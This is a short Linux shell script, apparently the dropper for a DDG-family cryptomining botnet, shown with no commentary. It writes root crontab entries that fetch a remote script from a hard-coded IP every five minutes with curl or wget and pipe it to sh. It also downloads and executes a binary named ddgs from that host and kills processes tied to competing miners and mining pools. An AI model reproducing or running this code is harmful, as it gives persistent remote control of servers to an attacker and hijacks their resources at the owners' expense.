export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh" > /var/spool/cron/root
echo "*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh" >> /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh" > /var/spool/cron/crontabs/root
echo "*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh" >> /var/spool/cron/crontabs/root

if [ ! -f "/tmp/ddgs.3011" ]; then
    curl -fsSL http://165.225.157.157:8000/static/3011/ddgs.i686 -o /tmp/ddgs.3011
fi
chmod +x /tmp/ddgs.3011 && /tmp/ddgs.3011

ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill
#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill

